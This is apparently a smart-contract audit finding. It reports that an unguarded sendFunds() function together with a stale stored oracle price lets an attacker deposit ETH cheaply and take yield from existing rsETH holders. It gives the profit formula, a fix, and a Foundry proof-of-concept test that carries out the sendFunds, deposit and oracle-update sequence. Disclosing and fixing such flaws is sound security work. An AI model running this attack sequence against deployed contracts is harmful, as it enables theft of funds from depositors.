### Title
Unguarded `FeeReceiver.sendFunds()` Enables Stale-Price Deposit to Steal Accumulated Yield — (`contracts/FeeReceiver.sol`)

---

### Summary

`FeeReceiver.sendFunds()` carries no access-control modifier. Any caller can flush the entire accumulated MEV/execution-layer reward balance into `LRTDepositPool` at will. Because `LRTOracle.rsETHPrice` is a **stored** value that is only refreshed when `updateRSETHPrice()` is explicitly called, a window exists between the TVL increase (caused by `sendFunds()`) and the next oracle update. During that window an attacker can deposit ETH at the stale (pre-reward) price, receiving more rsETH than is fair, and thereby siphon a portion of the accumulated yield away from existing holders.

---

### Finding Description

**Step 1 — No access control on `sendFunds()`** [1](#0-0) 

The function is `external` with no role check. Any EOA or contract can call it at any time.

**Step 2 — `receiveFromRewardReceiver` is also unguarded** [2](#0-1) 

ETH is accepted unconditionally; `address(this).balance` of the deposit pool increases immediately.

**Step 3 — TVL is read live; oracle price is stale**

`getTotalAssetDeposits(ETH_TOKEN)` delegates to `getETHDistributionData()`, which reads `address(this).balance` of the deposit pool directly: [3](#0-2) 

`_getTotalEthInProtocol()` in the oracle also calls `getTotalAssetDeposits`: [4](#0-3) 

However, `rsETHPrice` is a **stored** state variable: [5](#0-4) 

It is only updated when `updateRSETHPrice()` is called: [6](#0-5) 

**Step 4 — Deposit uses the stale stored price** [7](#0-6) 

`lrtOracle.rsETHPrice()` returns the stored value, not a freshly computed one. After `sendFunds()` increases TVL but before the oracle is updated, this price is lower than the true post-reward price.

---

### Impact Explanation

Let:
- `T` = TVL before rewards, `S` = rsETH supply, `R` = accumulated rewards flushed by `sendFunds()`, `D` = attacker deposit.

**Fair rsETH for deposit D** (if oracle were updated first): `D·S/(T+R)`

**Actual rsETH received at stale price**: `D·S/T`

**Extra rsETH stolen**: `D·S·R / (T·(T+R))`

After the oracle updates, the value of this extra rsETH is approximately `D·R/(T+R)` ETH — a direct transfer of yield from existing holders to the attacker. The attacker's profit scales with the size of the accumulated reward `R` and their deposit `D`.

---

### Likelihood Explanation

- `sendFunds()` is callable by any address with no preconditions.
- `updateRSETHPrice()` is also public, so the attacker controls the exact moment the oracle refreshes.
- The attack requires only two sequential transactions in the same block (or across blocks): `sendFunds()` then `depositETH()`, followed by `updateRSETHPrice()`.
- No privileged access, no leaked keys, no external protocol compromise is needed.
- Rewards accumulate continuously; the attack can be repeated every time a meaningful balance builds up in `FeeReceiver`.

---

### Recommendation

Add an access-control guard to `sendFunds()`, restricting it to the `MANAGER` role (already set up in `initialize`):

```solidity
function sendFunds() external onlyRole(LRTConstants.MANAGER) {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

Additionally, consider atomically calling `updateRSETHPrice()` inside the same transaction as `sendFunds()` (or inside `receiveFromRewardReceiver`) so the oracle price is always consistent with the TVL at the time of any deposit.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Fork test (Foundry) — run against a mainnet/testnet fork
// Assumes: FeeReceiver has accumulated 10 ETH in rewards
//          LRTDepositPool TVL = 10_000 ETH, rsETH supply = 9_900 rsETH (price ~1.0101 ETH/rsETH)

contract PoC is Test {
    FeeReceiver feeReceiver = FeeReceiver(FEE_RECEIVER_ADDR);
    LRTDepositPool pool     = LRTDepositPool(DEPOSIT_POOL_ADDR);
    LRTOracle oracle        = LRTOracle(ORACLE_ADDR);
    IRSETH rsETH            = IRSETH(RSETH_ADDR);

    function testStealYield() external {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        // Snapshot oracle price before attack
        uint256 priceBefore = oracle.rsETHPrice();

        vm.startPrank(attacker);

        // 1. Flush 10 ETH of accumulated rewards into deposit pool (no access control)
        feeReceiver.sendFunds();

        // 2. Deposit at stale (pre-reward) price — attacker gets more rsETH than fair
        uint256 rsETHBefore = rsETH.balanceOf(attacker);
        pool.depositETH{value: 100 ether}(0, "");
        uint256 rsETHReceived = rsETH.balanceOf(attacker) - rsETHBefore;

        // 3. Trigger oracle update
        oracle.updateRSETHPrice();

        uint256 priceAfter = oracle.rsETHPrice();

        // 4. Assert attacker received more rsETH than fair
        uint256 fairRsETH = 100 ether * 1e18 / priceAfter; // fair amount at post-reward price
        assertGt(rsETHReceived, fairRsETH, "attacker received excess rsETH");

        // 5. Attacker's rsETH is worth more than 100 ETH deposited
        uint256 attackerETHValue = rsETHReceived * priceAfter / 1e18;
        assertGt(attackerETHValue, 100 ether, "attacker profited from stolen yield");

        vm.stopPrank();
    }
}
```

The test demonstrates that by calling `sendFunds()` before depositing, the attacker receives rsETH at the pre-reward price, capturing a share of the accumulated yield that belongs to existing holders.

### Citations

**File:** contracts/FeeReceiver.sol (L53-58)
```text
    function sendFunds() external {
        uint256 balance = address(this).balance;
        ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();

        emit MevRewardsAddedToTVL(balance);
    }
```

**File:** contracts/LRTDepositPool.sol (L60-61)
```text
    /// @dev receive from RewardReceiver
    function receiveFromRewardReceiver() external payable { }
```

**File:** contracts/LRTDepositPool.sol (L480-480)
```text
        ethLyingInDepositPool = address(this).balance;
```

**File:** contracts/LRTDepositPool.sol (L519-520)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**File:** contracts/LRTOracle.sol (L28-28)
```text
    uint256 public override rsETHPrice;
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L341-343)
```text
            uint256 totalAssetAmt = ILRTDepositPool(lrtDepositPoolAddr).getTotalAssetDeposits(asset);

            totalETHInProtocol += totalAssetAmt.mulWad(assetER);
```
